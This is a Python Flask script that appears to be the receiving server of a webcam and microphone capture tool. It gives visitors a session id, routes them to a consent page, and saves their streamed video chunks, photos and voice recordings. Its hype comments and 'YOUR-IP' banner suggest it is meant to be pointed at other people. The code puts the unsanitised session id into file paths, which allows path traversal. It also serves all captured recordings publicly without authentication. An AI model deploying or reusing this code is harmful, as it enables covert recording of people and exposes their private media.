#!/usr/bin/env python3
import os, json, datetime, uuid
from pathlib import Path
from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

app = Flask(__name__, template_folder="templates", static_folder="static")

@app.route("/")
def index(): return redirect("/start")

@app.route("/start")
def start():
    sid = str(uuid.uuid4())
    return redirect(url_for("consent", sid=sid))

@app.route("/consent/<sid>")
def consent(sid):
    return render_template("consent.html", sid=sid)

# LIVE VIDEO STREAM — 100% WORKING
@app.route("/stream_video", methods=["POST"])
def stream_video():
    sid = request.form.get("sid")
    if not sid or "video_chunk" not in request.files:
        return "", 400

    file = request.files["video_chunk"]
    data = file.read()
    if len(data) < 30000:  # skip tiny blobs
        return "", 204

    folder = UPLOAD_DIR / f"{sid}_stream"
    folder.mkdir(exist_ok=True)

    try:
        idx = int(request.form["index"])
    except:
        idx = len(list(folder.glob("*.webm")))

    path = folder / f"{idx:06d}.webm"
    path.write_bytes(data)
    print(f"VIDEO CHUNK SAVED: {path.name} ({len(data)} bytes)")
    return "", 204

# PHOTO
@app.route("/upload_photo", methods=["POST"])
def photo():
    sid = request.form.get("sid")
    file = request.files["photo"]
    name = f"photo_{sid}_{int(datetime.datetime.now().timestamp()*1000)}.jpg"
    (UPLOAD_DIR / name).write_bytes(file.read())
    return jsonify({"ok": True})

# UNLIMITED VOICE RECORDING
@app.route("/upload_voice", methods=["POST"])
def voice():
    sid = request.form.get("sid")
    if "voice" not in request.files: return "", 400
    file = request.files["voice"]
    name = f"voice_{sid}.webm"
    path = UPLOAD_DIR / name
    file.save(path)
    print(f"VOICE SAVED: {name} ({path.stat().st_size} bytes)")
    return jsonify({"ok": True})

@app.route("/uploads/<path:p>")
def uploads(p): return send_from_directory(UPLOAD_DIR, p)

if __name__ == "__main__":
    print("\nLIVE + UNLIMITED VOICE READY → http://YOUR-IP:5000\n")
    app.run(host="0.0.0.0", port=5000, threaded=True)
